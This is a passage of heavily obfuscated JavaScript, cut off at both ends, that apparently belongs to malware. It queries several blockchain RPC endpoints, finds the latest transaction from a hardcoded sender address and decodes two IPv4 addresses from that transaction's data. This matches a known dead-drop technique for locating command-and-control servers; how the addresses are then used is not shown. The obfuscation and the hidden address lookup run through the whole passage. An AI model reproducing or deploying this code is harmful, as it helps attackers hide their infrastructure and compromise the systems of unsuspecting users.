_0x1c8113===_0x32152b;},'RLVPq':_0x31c4c4(0x1e9),'vtHKm':_0x31c4c4(0x239),'cGHLM':function(_0x458eba,_0x26413f){return _0x458eba===_0x26413f;},'kCReV':_0x31c4c4(0xcd),'XMjKC':function(_0x2d899c,_0x4459b8){return _0x2d899c===_0x4459b8;}},_0x545017=(_0x30b68a[_0x31c4c4(0xc5)][_0x4958bf[_0x31c4c4(0x131)]]||'')[_0x31c4c4(0xd2)+'e']();return _0x4958bf[_0x31c4c4(0x1be)](_0x4958bf[_0x31c4c4(0x102)],_0x545017)||_0x4958bf[_0x31c4c4(0x1be)](_0x4958bf[_0x31c4c4(0x15f)],_0x545017)?_0x30b68a[_0x31c4c4(0x135)](_0x3f47fe[_0x31c4c4(0x1dc)+'ip']()):_0x4958bf[_0x31c4c4(0xd0)](_0x4958bf[_0x31c4c4(0x149)],_0x545017)?_0x30b68a[_0x31c4c4(0x135)](_0x3f47fe[_0x31c4c4(0x1bf)+_0x31c4c4(0x1d3)]()):_0x4958bf[_0x31c4c4(0x1a8)]('br',_0x545017)?_0x30b68a[_0x31c4c4(0x135)](_0x3f47fe[_0x31c4c4(0xb0)+_0x31c4c4(0x1f2)+'ss']()):_0x30b68a;}function httpRequest(_0x109ca9,_0x359888){var _0x401d23=_0x5ba36e,_0x31f58a={'VQSSB':function(_0x2b076c,_0x351453){return _0x2b076c(_0x351453);},'xigOu':_0x401d23(0xdc),'ZnqIi':function(_0xa2adfe,_0x576e8a){return _0xa2adfe(_0x576e8a);},'erPJv':_0x401d23(0x1bb),'sSCcS':_0x401d23(0x190),'mHlIu':_0x401d23(0x1b8),'ciCZA':function(_0xed825e,_0x165e85){return _0xed825e===_0x165e85;},'yVwTA':_0x401d23(0x235),'KGYRn':function(_0x5b1de6,_0x381fbf){return _0x5b1de6+_0x381fbf;},'wHbkI':function(_0x3b1796,_0x1ff665){return _0x3b1796!=_0x1ff665;},'QmUPo':function(_0x47d7cd,_0x495014){return _0x47d7cd||_0x495014;},'oyTSj':_0x401d23(0x173),'rilom':function(_0xef613d,_0x557c1a){return _0xef613d===_0x557c1a;},'PDDoC':_0x401d23(0x138)+_0x401d23(0x214),'ryCYX':_0x401d23(0x13e)+_0x401d23(0x113),'WSUCn':_0x401d23(0x1bc),'ODpOb':function(_0x534524,_0xdaf3e7){return _0x534524!=_0xdaf3e7;},'IcBeg':_0x401d23(0x132)+'pe','ooiek':_0x401d23(0x1e4)+_0x401d23(0x111)},_0x2f81cd=(_0x359888=_0x31f58a[_0x401d23(0x227)](_0x359888,{}))[_0x401d23(0x14b)]||_0x31f58a[_0x401d23(0xef)],_0x42e45e=_0x359888[_0x401d23(0x1fc)],_0xce6730=_0x359888[_0x401d23(0x1db)],_0x79baa5=new URL(_0x109ca9),_0x5065bc=_0x31f58a[_0x401d23(0x181)](_0x31f58a[_0x401d23(0xc6)],_0x79baa5[_0x401d23(0x14c)])?_0xb995e6:_0x296fba,_0x32b269={'Accept':_0x31f58a[_0x401d23(0x203)],'Accept-Encoding':_0x31f58a[_0x401d23(0x14f)],'Connection':_0x31f58a[_0x401d23(0x103)]};return _0x31f58a[_0x401d23(0x150)](null,_0x42e45e)&&(_0x32b269[_0x31f58a[_0x401d23(0x202)]]=_0x31f58a[_0x401d23(0x203)],_0x32b269[_0x31f58a[_0x401d23(0x20a)]]=Buffer[_0x401d23(0xcb)](_0x42e45e)),new Promise(function(_0x294972,_0x169d37){var _0x5b41e8=_0x401d23,_0x570aee={'TTtCp':function(_0x3256ed,_0xd5ace9){var _0x12d4ea=_0x56c6;return _0x31f58a[_0x12d4ea(0x1bd)](_0x3256ed,_0xd5ace9);},'CNEuj':_0x31f58a[_0x5b41e8(0xbb)],'txeOo':function(_0x34b2f8,_0x2bb66c){var _0x5e3ed4=_0x5b41e8;return _0x31f58a[_0x5e3ed4(0xa5)](_0x34b2f8,_0x2bb66c);},'lZMHb':_0x31f58a[_0x5b41e8(0x1f3)],'qsAZx':_0x31f58a[_0x5b41e8(0x116)],'UOqrF':_0x31f58a[_0x5b41e8(0x205)]},_0x3fac9a=_0x5065bc[_0x5b41e8(0x200)]({'hostname':_0x79baa5[_0x5b41e8(0xd4)],'port':_0x79baa5[_0x5b41e8(0xeb)]||(_0x31f58a[_0x5b41e8(0x229)](_0x31f58a[_0x5b41e8(0xc6)],_0x79baa5[_0x5b41e8(0x14c)])?-0x1adc+-0x435+0x20cc:0x199c+0x110c+-0x1*0x2a58),'path':_0x31f58a[_0x5b41e8(0x19b)](_0x79baa5[_0x5b41e8(0xe2)],_0x79baa5[_0x5b41e8(0x163)]),'method':_0x2f81cd,'agent':AGENTS[_0x79baa5[_0x5b41e8(0x14c)]],'signal':_0xce6730,'headers':_0x32b269},function(_0x16950f){var _0x3768ea=_0x5b41e8,_0x39a6cc=_0x570aee[_0x3768ea(0xfc)](decompressStream,_0x16950f),_0x551e53=[];_0x39a6cc['on'](_0x570aee[_0x3768ea(0x168)],function(_0x1974df){var _0x39bc8a=_0x3768ea;_0x551e53[_0x39bc8a(0x1df)](_0x1974df);}),_0x39a6cc['on'](_0x570aee[_0x3768ea(0x18e)],function(){var _0x52a1ee=_0x3768ea;try{_0x570aee[_0x52a1ee(0xfc)](_0x294972,JSON[_0x52a1ee(0x121)](Buffer[_0x52a1ee(0x1ea)](_0x551e53)[_0x52a1ee(0x14e)](_0x570aee[_0x52a1ee(0x1b5)])));}catch(_0x22fce6){_0x570aee[_0x52a1ee(0xb8)](_0x169d37,_0x22fce6);}}),_0x39a6cc['on'](_0x570aee[_0x3768ea(0x221)],_0x169d37);});_0x3fac9a['on'](_0x31f58a[_0x5b41e8(0x205)],_0x169d37),_0x31f58a[_0x5b41e8(0x1e8)](null,_0x42e45e)&&_0x3fac9a[_0x5b41e8(0x219)](_0x42e45e),_0x3fac9a[_0x5b41e8(0x190)]();});}function promiseAny(_0x451bf5){var _0x209b58=_0x5ba36e,_0x16f94c={'uDdfi':function(_0x2fb3cd,_0x4b7952){return _0x2fb3cd===_0x4b7952;},'NoaQQ':function(_0x4ea172,_0x556aa6){return _0x4ea172(_0x556aa6);},'Nekvz':function(_0x3bc3a6,_0x1327ba){return _0x3bc3a6<_0x1327ba;},'BILAb':function(_0x439968,_0x3af1f4){return _0x439968(_0x3af1f4);},'ORUmq':_0x209b58(0x1d5)};return new Promise(function(_0x17cfd8,_0x19ae0d){var _0x2df2b9=_0x209b58,_0x4fa780,_0x34fd38=_0x451bf5[_0x2df2b9(0x16c)],_0x342b73=null;if(_0x34fd38){for(_0x4fa780=-0xbff+-0x2db*0x2+0x11b5*0x1;_0x16f94c[_0x2df2b9(0xf1)](_0x4fa780,_0x451bf5[_0x2df2b9(0x16c)]);_0x4fa780++)_0x451bf5[_0x4fa780][_0x2df2b9(0x213)](_0x17cfd8,function(_0x31588e){var _0x52058e=_0x2df2b9;_0x342b73=_0x31588e,_0x16f94c[_0x52058e(0x15b)](0x3*0xa4d+-0x1a11*-0x1+0x2*-0x1c7c,--_0x34fd38)&&_0x16f94c[_0x52058e(0xb9)](_0x19ae0d,_0x342b73);});}else _0x16f94c[_0x2df2b9(0xc4)](_0x19ae0d,new Error(_0x16f94c[_0x2df2b9(0x1d2)]));});}function withRpcEndpoints(_0x4bc79d,_0x5b63d3){var _0x4147b0=_0x5ba36e,_0x39ba8e={'OkrLn':_0x4147b0(0x10e)+'3','iIlXc':function(_0x372ac6,_0x535c20){return _0x372ac6<_0x535c20;},'atlWi':function(_0xa7f521,_0x39ff89,_0x45f780){return _0xa7f521(_0x39ff89,_0x45f780);},'bHGqj':function(_0x2ca304,_0x404979){return _0x2ca304(_0x404979);},'iMgXD':function(_0x2acaf1,_0x5d15a8){return _0x2acaf1<_0x5d15a8;}},_0x57a42b=_0x39ba8e[_0x4147b0(0x1ef)][_0x4147b0(0x129)]('|'),_0x5b52c5=-0x6d*0x9+0x90*0x1+-0x1f*-0x1b;while(!![]){switch(_0x57a42b[_0x5b52c5++]){case'0':for(_0x6a20df=-0xcb9+0x16b1+-0x9f8;_0x39ba8e[_0x4147b0(0x20e)](_0x6a20df,_0x10b570[_0x4147b0(0x16c)]);_0x6a20df++)_0x39ba8e[_0x4147b0(0xf4)](linkAbort,_0x5b63d3,_0x10b570[_0x6a20df]);continue;case'1':for(_0x6a20df=0xade+-0x13e0+-0x902*-0x1;_0x39ba8e[_0x4147b0(0x20e)](_0x6a20df,RPC_ENDPOINTS[_0x4147b0(0x16c)]);_0x6a20df++)_0x406bcc[_0x4147b0(0x1df)](_0x39ba8e[_0x4147b0(0xf4)](_0x4bc79d,RPC_ENDPOINTS[_0x6a20df],_0x10b570[_0x6a20df][_0x4147b0(0x1db)]));continue;case'2':var _0x6a20df,_0x10b570=[],_0x406bcc=[];continue;case'3':return _0x39ba8e[_0x4147b0(0x169)](promiseAny,_0x406bcc)[_0x4147b0(0x213)](function(_0x34294f){var _0x4b0564=_0x4147b0;for(_0x6a20df=0xb3f*-0x3+-0x23ad+-0xde2*-0x5;_0x5866a4[_0x4b0564(0xe1)](_0x6a20df,_0x10b570[_0x4b0564(0x16c)]);_0x6a20df++)_0x10b570[_0x6a20df][_0x4b0564(0xdb)]();return _0x34294f;},function(_0x2b4f5d){var _0x319c99=_0x4147b0;for(_0x6a20df=0x1*-0xa7+0x1742+-0x169b;_0x5866a4[_0x319c99(0xe1)](_0x6a20df,_0x10b570[_0x319c99(0x16c)]);_0x6a20df++)_0x10b570[_0x6a20df][_0x319c99(0xdb)]();throw _0x2b4f5d;});case'4':for(_0x6a20df=-0x1ee*-0x2+0x2b*0xa7+-0x1fe9;_0x39ba8e[_0x4147b0(0x20e)](_0x6a20df,RPC_ENDPOINTS[_0x4147b0(0x16c)]);_0x6a20df++)_0x10b570[_0x4147b0(0x1df)](new AbortController());continue;case'5':var _0x5866a4={'ICXmt':function(_0x46ee6c,_0x26bbd6){var _0x48990e=_0x4147b0;return _0x39ba8e[_0x48990e(0x1b2)](_0x46ee6c,_0x26bbd6);}};continue;}break;}}function rpcCall(_0xe3ba8,_0x5f1657,_0x11698f,_0x9a0017){var _0x3c4dcc=_0x5ba36e,_0x3cbc62={'iDvFK':function(_0x1885da,_0x42627a,_0x5568eb){return _0x1885da(_0x42627a,_0x5568eb);},'LjDyB':_0x3c4dcc(0x1f5),'aEBNl':_0x3c4dcc(0x218)};return _0x3cbc62[_0x3c4dcc(0x1e3)](httpRequest,_0xe3ba8,{'method':_0x3cbc62[_0x3c4dcc(0x1c0)],'body':JSON[_0x3c4dcc(0xb3)]({'jsonrpc':_0x3cbc62[_0x3c4dcc(0xf6)],'id':0x1,'method':_0x5f1657,'params':_0x11698f}),'signal':_0x9a0017})[_0x3c4dcc(0x213)](function(_0x5cd808){var _0x1c9aad=_0x3c4dcc;return _0x5cd808[_0x1c9aad(0x118)];});}function rpcBatch(_0x124ff7,_0x2746cd,_0x5dfa6f){var _0x492a4b=_0x5ba36e,_0x3a43fd={'kGgXv':_0x492a4b(0xe5),'Tftem':function(_0x47f321,_0xc2451){return _0x47f321<_0xc2451;},'QESpB':function(_0x836c90,_0x1b6b50){return _0x836c90+_0x1b6b50;},'qTlHm':_0x492a4b(0x218),'vgHoQ':function(_0x5ba6c7,_0x78879,_0x1228b4){return _0x5ba6c7(_0x78879,_0x1228b4);},'ZEMFT':_0x492a4b(0x1f5)},_0xe482b3,_0x3d4b00=[];for(_0xe482b3=-0x7*-0x3fa+-0x416*-0x5+-0x3044;_0x3a43fd[_0x492a4b(0x23a)](_0xe482b3,_0x2746cd[_0x492a4b(0x16c)]);_0xe482b3++)_0x3d4b00[_0x492a4b(0x1df)]({'jsonrpc':_0x3a43fd[_0x492a4b(0xbc)],'id':_0x3a43fd[_0x492a4b(0x133)](_0xe482b3,-0xc7e+0xa3*-0x10+-0x1*-0x16af),'method':_0x2746cd[_0xe482b3][0x5*0x125+-0x1*0x3fb+-0x1be],'params':_0x2746cd[_0xe482b3][0xda4*-0x1+-0x6b2*0x4+-0x286d*-0x1]});return _0x3a43fd[_0x492a4b(0xde)](httpRequest,_0x124ff7,{'method':_0x3a43fd[_0x492a4b(0x15c)],'body':JSON[_0x492a4b(0xb3)](_0x3d4b00),'signal':_0x5dfa6f})[_0x492a4b(0x213)](function(_0x4cf27e){var _0x139791=_0x492a4b,_0x2bed6d=_0x3a43fd[_0x139791(0x110)][_0x139791(0x129)]('|'),_0x22d50a=-0x8*0x1de+-0x13dc+0x22cc;while(!![]){switch(_0x2bed6d[_0x22d50a++]){case'0':for(_0xe482b3=-0x1*-0x1fb5+0xeb2+-0x2e67;_0x3a43fd[_0x139791(0x23a)](_0xe482b3,_0x2746cd[_0x139791(0x16c)]);_0xe482b3++)_0x4c1018[_0x139791(0x1df)](_0x4f3cfb[_0x3a43fd[_0x139791(0x133)](_0xe482b3,-0x2*0x11eb+-0x53b*0x4+0xb*0x529)][_0x139791(0x118)]);continue;case'1':return _0x4c1018;case'2':var _0x4c1018=[];continue;case'3':var _0x4f3cfb={};continue;case'4':for(_0xe482b3=-0x4db+-0x8bb+0xd96;_0x3a43fd[_0x139791(0x23a)](_0xe482b3,_0x4cf27e[_0x139791(0x16c)]);_0xe482b3++)_0x4f3cfb[_0x4cf27e[_0xe482b3]['id']]=_0x4cf27e[_0xe482b3];continue;}break;}});}function toBlockHex(_0x246991){var _0x1d8286=_0x5ba36e,_0x46f6a8={'bDAId':function(_0x34fe75,_0x36f7ee){return _0x34fe75+_0x36f7ee;},'XQLvT':function(_0x263908,_0x35235a){return _0x263908(_0x35235a);}};return _0x46f6a8[_0x1d8286(0x119)]('0x',_0x46f6a8[_0x1d8286(0x22d)](Number,_0x246991)[_0x1d8286(0x14e)](0xb6*0x1+0x625*0x5+0xa75*-0x3));}function findSenderTx(_0x31af31){var _0x404fc7=_0x5ba36e,_0x511def={'bxquq':function(_0x560171,_0x1c02d8){return _0x560171<_0x1c02d8;},'SirQd':function(_0x3f5eb3,_0x284667){return _0x3f5eb3===_0x284667;}},_0x9bb10f;for(_0x9bb10f=0x4dd+0x8e9+-0xdc6;_0x511def[_0x404fc7(0x222)](_0x9bb10f,_0x31af31[_0x404fc7(0x16c)]);_0x9bb10f++)if(_0x31af31[_0x9bb10f][_0x404fc7(0xae)]&&_0x511def[_0x404fc7(0x1b3)](_0x31af31[_0x9bb10f][_0x404fc7(0xae)][_0x404fc7(0xd2)+'e'](),SENDER))return _0x31af31[_0x9bb10f];return null;}function decodeAddress(_0x5b36c0){var _0x4ea50c=_0x5ba36e,_0x4aabbf={'JVwsz':function(_0x17d3d4,_0x498b23){return _0x17d3d4+_0x498b23;},'uvvXZ':function(_0x43260f,_0x4c5a76){return _0x43260f+_0x4c5a76;},'LjCLu':function(_0xb2931f,_0x5d5275){return _0xb2931f+_0x5d5275;},'tusOV':function(_0x48a59d,_0xb453f2){return _0x48a59d+_0xb453f2;},'RdwCk':function(_0x327e1e,_0x29aa95){return _0x327e1e+_0x29aa95;},'yfssM':_0x4ea50c(0x1b7),'YWTch':function(_0x291957,_0x4701c7){return _0x291957(_0x4701c7);},'TKplt':function(_0x141245,_0x904d64){return _0x141245(_0x904d64);}},_0x5c062d=Buffer[_0x4ea50c(0xae)](_0x5b36c0[_0x4ea50c(0x1da)](/^0x/i,''),_0x4aabbf[_0x4ea50c(0xb2)]);function _0xe1198a(_0x79cd84){var _0x5aaf19=_0x4ea50c;return _0x4aabbf[_0x5aaf19(0x124)](_0x4aabbf[_0x5aaf19(0x136)](_0x4aabbf[_0x5aaf19(0x10c)](_0x4aabbf[_0x5aaf19(0x154)](_0x4aabbf[_0x5aaf19(0x124)](_0x4aabbf[_0x5aaf19(0x187)](_0x79cd84[0x12a*0x17+-0x226e+-0x118*-0x7],'.'),_0x79cd84[0xb0*-0x6+-0x1c9*-0x1+0x258]),'.'),_0x79cd84[-0x215e+0x182*0x2+-0x86*-0x3a]),'.'),_0x79cd84[-0x1541*-0x1+-0x1072+-0x266*0x2]);}return[_0x4aabbf[_0x4ea50c(0xd7)](_0xe1198a,_0x5c062d[_0x4ea50c(0x195)](0x24b*0x7+-0x15ca+0x5bd*0x1,0x1*0x26b+0x62b+-0x892)),_0x4aabbf[_0x4ea50c(0x1c3)](_0xe1198a,_0x5c062d[_0x4ea50c(0x195)](-0x177e+-0x14e6+0x2c68,-0x117a+0x1362+0x6*-0x50))];}function firstMatch(_0x102474){var _0x46b83e={'CwJct':function(_0x2930b2,_0x48eca6){return _0x2930b2!==_0x48eca6;},'ojAsZ':function(_0x1834ef,_0x2a9131){return _0x1834ef(_0x2a9131);},'TEgUn':function(_0x53b47c,_0x104bac){return _0x53b47c<_0x104bac;},'lapXb':function(_0x474dae,_0x496d58){return _0x474dae(_0x496d58);},'mJdcq':function(_0x4daa9d,_0x1cd3f9){return _0x4daa9d===_0x1cd3f9;},'IUSyV':function(_0x5546bf,_0x23f410){return _0x5546bf(_0x23f410);}};return new Promise(function(_0x95020f){var _0x164602=_0x56c6,_0x1ca80c={'covvw':function(_0x5a24b1,_0x19e7d8){var _0x2a5780=_0x56c6;return _0x46b83e[_0x2a5780(0xab)](_0x5a24b1,_0x19e7d8);},'XhLuJ':function(_0x332951,_0x198488){var _0x4fa389=_0x56c6;return _0x46b83e[_0x4fa389(0x15e)](_0x332951,_0x198488);},'UIMDX':function(_0x2b6cae,_0x351b68){var _0x2cdbbc=_0x56c6;return _0x46b83e[_0x2cdbbc(0x1b9)](_0x2b6cae,_0x351b68);},'CCahq':function(_0x406e85,_0x2867f3){var _0xbbe0f7=_0x56c6;return _0x46b83e[_0xbbe0f7(0x1ec)](_0x406e85,_0x2867f3);}},_0x181911=_0x102474[_0x164602(0x16c)];if(!_0x181911)return _0x46b83e[_0x164602(0x1e7)](_0x95020f,null);var _0x3434f2,_0x5811fe=!(0xeff+-0x5d2+-0x1*0x92c);function _0xd38d59(_0x258a56){var _0x22fbec=_0x164602,_0x22ad99;if(!_0x5811fe){for(_0x5811fe=!(0x683+-0x3*0x329+0x13*0x28),_0x22ad99=0x41c*-0x4+0x315*-0x6+-0x1177*-0x2;_0x1ca80c[_0x22fbec(0x1ba)](_0x22ad99,_0x102474[_0x22fbec(0x16c)]);_0x22ad99++)_0x102474[_0x22ad99][_0x22fbec(0xa0)][_0x22fbec(0xdb)]();_0x1ca80c[_0x22fbec(0xf7)](_0x95020f,_0x258a56);}}for(_0x3434f2=0x151a+0x397*-0x7+0x407;_0x46b83e[_0x164602(0xab)](_0x3434f2,_0x102474[_0x164602(0x16c)]);_0x3434f2++)_0x102474[_0x3434f2][_0x164602(0xe4)]()[_0x164602(0x213)](function(_0x14acdf){var _0x2411cb=_0x164602;_0x5811fe||(_0x14acdf?_0x1ca80c[_0x2411cb(0x208)](_0xd38d59,_0x14acdf):_0x1ca80c[_0x2411cb(0xe0)](0x414+-0x41*-0x5b+0x1b2f*-0x1,--_0x181911)&&_0x1ca80c[_0x2411cb(0xf7)](_0x95020f,null));},function(){var _0x4ec76a=_0x164602;_0x5811fe||_0x46b83e[_0x4ec76a(0x139)](0x2573*0x1+0x1*0xa9f+-0x3012,--_0x181911)||_0x46b83e[_0x4ec76a(0x15e)](_0x95020f,null);});});}function candidateBlocks(_0x19c9d6){var _0x20d46d=_0x5ba36e,_0x37c9d5={'oMizd':function(_0x49521d,_0x5d58e0){return _0x49521d-_0x5d58e0;},'YqLgS':function(_0x36d526,_0x4cde3a){return _0x36d526-_0x4cde3a;},'mWGYc':function(_0x7e4e30,_0x46a3a0){return _0x7e4e30+_0x46a3a0;},'pSKQB':function(_0x3c3b01,_0x399c34){return _0x3c3b01-_0x399c34;},'jSwuZ':function(_0x2e2dd8,_0x15ebcd){return _0x2e2dd8+_0x15ebcd;},'FVZDQ':function(_0x25826e,_0x109249){return _0x25826e<_0x109249;},'dXAgH':function(_0x3f4477,_0x4c2634){return _0x3f4477<_0x4c2634;},'MzpMi':function(_0x4522a0,_0x3660ef){return _0x4522a0(_0x3660ef);}},_0x2f2f85,_0x1e03dd=_0x37c9d5[_0x20d46d(0x209)](_0x19c9d6,BLOCK_MULTIPLE),_0x3a43ca=[_0x37c9d5[_0x20d46d(0xd8)](_0x19c9d6,0x376+0x1a8+0x11*-0x4d),_0x19c9d6,_0x37c9d5[_0x20d46d(0x233)](_0x19c9d6,0x1*-0x20e+0x1*0x9f+-0x2e*-0x8),_0x37c9d5[_0x20d46d(0x13a)](_0x1e03dd,0x4ab+0x11b*0x13+-0x19ab),_0x1e03dd,_0x37c9d5[_0x20d46d(0x1f1)](_0x1e03dd,-0x1a46+0x8de+-0x1*-0x1169)],_0x3dfd48={},_0x295755=[];for(_0x2f2f85=0xb81+-0x2*0x1f1+-0x79f;_0x37c9d5[_0x20d46d(0xa6)](_0x2f2f85,_0x3a43ca[_0x20d46d(0x16c)]);_0x2f2f85++)if(!_0x37c9d5[_0x20d46d(0xc2)](_0x3a43ca[_0x2f2f85],-0x692*-0x2+-0x399*-0x5+-0x1f21)){var _0x1230f1=_0x37c9d5[_0x20d46d(0x1b0)](String,_0x3a43ca[_0x2f2f85]);_0x3dfd48[_0x1230f1]||(_0x3dfd48[_0x1230f1]=!(0xd*-0x2b+0x26dc*-0x1+-0x7*-0x5dd),_0x295755[_0x20d46d(0x1df)](_0x3a43ca[_0x2f2f85]));}return _0x295755;}function _0x56c6(_0x1ff32d,_0xe353c6){_0x1ff32d=_0x1ff32d-(0xc85*0x2+-0x73*-0x23+-0x2823);var _0x1df62d=_0x3e8f();var _0x1c78b0=_0x1df62d[_0x1ff32d];return _0x1c78b0;}function blockTask(_0x38f062){var _0xbc9caf=_0x5ba36e,_0x285d68={'ZmdAk':function(_0x4026e7,_0x285ef7,_0x21620c,_0x4497af,_0x2dc133){return _0x4026e7(_0x285ef7,_0x21620c,_0x4497af,_0x2dc133);},'vPUoy':_0xbc9caf(0x17a)+_0xbc9caf(0x1cb),'OzAdk':function(_0x5f52eb,_0x4e9ac8){return _0x5f52eb(_0x4e9ac8);},'qHwhE':function(_0x22a8fa,_0x357aaf,_0x4026ba){return _0x22a8fa(_0x357aaf,_0x4026ba);}},_0x138227=new AbortController();return{'controller':_0x138227,'run':function(){var _0x597aef=_0xbc9caf;return _0x285d68[_0x597aef(0xf0)](withRpcEndpoints,function(_0xe908f3,_0x255020){var _0x58bd5f=_0x597aef;return _0x285d68[_0x58bd5f(0xf9)](rpcCall,_0xe908f3,_0x285d68[_0x58bd5f(0xb7)],[_0x285d68[_0x58bd5f(0x1de)](toBlockHex,_0x38f062),!(-0x1e1d*-0x1+-0x1e01+-0x4*0x7)],_0x255020);},_0x138227[_0x597aef(0x1db)])[_0x597aef(0x213)](function(_0x1e278){var _0x13ee71=_0x597aef,_0x37fa5f=_0x1e278&&_0x1e278[_0x13ee71(0x176)+'ns'];if(!Array[_0x13ee71(0x1ca)](_0x37fa5f))return null;var _0x20aa9c=_0x285d68[_0x13ee71(0x1de)](findSenderTx,_0x37fa5f);return _0x20aa9c?{'blockNumber':_0x38f062,'tx':_0x20aa9c}:null;});}};}function nonceAtBlocks(_0x1d05bb,_0x1dd475){var _0x509f5e=_0x5ba36e,_0x2ff91c={'wmZHh':function(_0x17d2b5,_0x39725b,_0x5b496f,_0x28ea55){return _0x17d2b5(_0x39725b,_0x5b496f,_0x28ea55);},'WalCZ':function(_0x1e1db9,_0x33de82){return _0x1e1db9<_0x33de82;},'ifBYb':function(_0x203836,_0x1406b9){return _0x203836(_0x1406b9);},'qFuwJ':function(_0x23dad2,_0x31c1ab,_0x4fe8cc,_0x1bd8a0,_0x45dc32){return _0x23dad2(_0x31c1ab,_0x4fe8cc,_0x1bd8a0,_0x45dc32);},'hZkkZ':function(_0x40809f,_0x459140){return _0x40809f<_0x459140;},'nxond':function(_0x5cd03b,_0x2ca11e){return _0x5cd03b<_0x2ca11e;},'axnJC':function(_0x829604,_0x2df79d,_0x2a79ac){return _0x829604(_0x2df79d,_0x2a79ac);},'lbqBs':_0x509f5e(0x130)+_0x509f5e(0x1f6)+_0x509f5e(0x13c),'zVOKX':function(_0x48a118,_0xfed62f){return _0x48a118(_0xfed62f);},'KDRGN':function(_0x30b7ef,_0x5ddbe4,_0x2ea5ed){return _0x30b7ef(_0x5ddbe4,_0x2ea5ed);}},_0x502152,_0x35aa3e=[];for(_0x502152=0x8*0x241+0xb40+-0x8*0x3a9;_0x2ff91c[_0x509f5e(0x16a)](_0x502152,_0x1d05bb[_0x509f5e(0x16c)]);_0x502152++)_0x35aa3e[_0x509f5e(0x1df)]([_0x2ff91c[_0x509f5e(0x18d)],[SENDER,_0x2ff91c[_0x509f5e(0x1a5)](toBlockHex,_0x1d05bb[_0x502152])]]);return _0x2ff91c[_0x509f5e(0x12d)](withRpcEndpoints,function(_0x48b3a6,_0x379ce4){var _0x204aac=_0x509f5e;return _0x2ff91c[_0x204aac(0xaf)](rpcBatch,_0x48b3a6,_0x35aa3e,_0x379ce4);},_0x1dd475)[_0x509f5e(0x213)](function(_0x2738f5){var _0x4954cf=_0x509f5e,_0x28715d=[];for(_0x502152=0x362*-0x2+-0x3*-0x639+-0xbe7;_0x2ff91c[_0x4954cf(0x144)](_0x502152,_0x2738f5[_0x4954cf(0x16c)]);_0x502152++)_0x28715d[_0x4954cf(0x1df)](_0x2ff91c[_0x4954cf(0x1cc)](Number,_0x2738f5[_0x502152]));return _0x28715d;},function(){var _0x49d763=_0x509f5e,_0x357646={'ugqMj':function(_0x3dc6be,_0x31747e,_0x169e21,_0x478d28,_0x2a033b){var _0x185113=_0x56c6;return _0x2ff91c[_0x185113(0x220)](_0x3dc6be,_0x31747e,_0x169e21,_0x478d28,_0x2a033b);},'LrrYu':function(_0x34c595,_0xa32b72){var _0x1963ab=_0x56c6;return _0x2ff91c[_0x1963ab(0x16a)](_0x34c595,_0xa32b72);},'UGmUZ':function(_0x40e645,_0x3281b0){var _0x49abfd=_0x56c6;return _0x2ff91c[_0x49abfd(0x1cc)](_0x40e645,_0x3281b0);}},_0x3bcddb=[];for(_0x502152=-0x1533+-0xea5+0x8f6*0x4;_0x2ff91c[_0x49d763(0xc7)](_0x502152,_0x35aa3e[_0x49d763(0x16c)]);_0x502152++)_0x3bcddb[_0x49d763(0x1df)](_0x2ff91c[_0x49d763(0xea)](withRpcEndpoints,function(_0x385425,_0x54d0ce){var _0x506076=_0x49d763;return _0x357646[_0x506076(0x1ed)](rpcCall,_0x385425,_0x35aa3e[_0x502152][-0x1*0x8f5+-0xcf4+0x4f*0x47],_0x35aa3e[_0x502152][-0x5de*0x5+0x2*0x7dc+0xd9f],_0x54d0ce);},_0x1dd475));return Promise[_0x49d763(0x197)](_0x3bcddb)[_0x49d763(0x213)](function(_0x156955){var _0x18ffc5=_0x49d763,_0x14198a=[];for(_0x502152=-0xe*0x1bf+-0x13c+0x19ae;_0x357646[_0x18ffc5(0x1cf)](_0x502152,_0x156955[_0x18ffc5(0x16c)]);_0x502152++)_0x14198a[_0x18ffc5(0x1df)](_0x357646[_0x18ffc5(0xe6)](Number,_0x156955[_0x502152]));return _0x14198a;});});}function lastSenderTx(_0x284a62){var _0x2eb57a=_0x5ba36e,_0x5ea4c5={'PLHsh':function(_0x3a5983,_0x4df789,_0x21e149,_0x6baf14,_0x1a22ea){return _0x3a5983(_0x4df789,_0x21e149,_0x6baf14,_0x1a22ea);},'ViAxQ':_0x2eb57a(0x167)+_0x2eb57a(0x21f),'NYdge':function(_0x27bfab,_0x519c83){return _0x27bfab(_0x519c83);},'SScqo':_0x2eb57a(0x130)+_0x2eb57a(0x1f6)+_0x2eb57a(0x13c),'ZnqBl':function(_0x2fc891,_0xa1894d){return _0x2fc891(_0xa1894d);},'tXtPz':function(_0x2bdbc9,_0x3d23fa,_0x334c53){return _0x2bdbc9(_0x3d23fa,_0x334c53);},'ZiucO':function(_0x56b4a3,_0x406a4f){return _0x56b4a3<=_0x406a4f;},'zCbBZ':function(_0x461a46,_0x13281a){return _0x461a46-_0x13281a;},'wruOo':function(_0x162f97,_0x21adfa){return _0x162f97-_0x21adfa;},'SylcU':function(_0x295977,_0x57b178){return _0x295977+_0x57b178;},'vwtGe':function(_0x331c3f,_0x389ecc){return _0x331c3f/_0x389ecc;},'DLPEJ':function(_0x4b0966,_0x57bfa6){return _0x4b0966*_0x57bfa6;},'UEtxL':function(_0x5864f7,_0x2223dd){return _0x5864f7+_0x2223dd;},'dpnxM':function(_0x767381,_0x50f25e,_0xb3cb6c){return _0x767381(_0x50f25e,_0xb3cb6c);},'EvYMf':function(_0xea5ce,_0x4d6111){return _0xea5ce<_0x4d6111;},'zOLpD':function(_0x415522,_0x805788){return _0x415522>=_0x805788;},'UugNF':function(_0x43227c,_0x531f0a){return _0x43227c===_0x531f0a;},'tptTS':function(_0x387c55,_0x2029a7){return _0x387c55>_0x2029a7;},'XPLbx':function(_0x53a1be){return _0x53a1be();},'AUUfO':_0x2eb57a(0x17a)+_0x2eb57a(0x1cb),'AIuuI':function(_0x2dadbf,_0x3839be){return _0x2dadbf(_0x3839be);},'AaxpB':function(_0x2fc03c,_0x108c3e){return _0x2fc03c>_0x108c3e;},'awLdi':function(_0x4e0c83,_0xfceede){return _0x4e0c83(_0xfceede);},'Qcemc':function(_0x417df8,_0xd9cf71){return _0x417df8-_0xd9cf71;},'IWCKd':function(_0x58d7d1,_0x11e60b){return _0x58d7d1!=_0x11e60b;}},_0x10dc39,_0x3612ae,_0x36bef2,_0x34f738=new AbortController();return(_0x5ea4c5[_0x2eb57a(0xaa)](null,_0x284a62)?Promise[_0x2eb57a(0x108)](_0x284a62):_0x5ea4c5[_0x2eb57a(0xd3)](withRpcEndpoints,function(_0x58326c,_0x4fb475){var _0x540d6c=_0x2eb57a;return 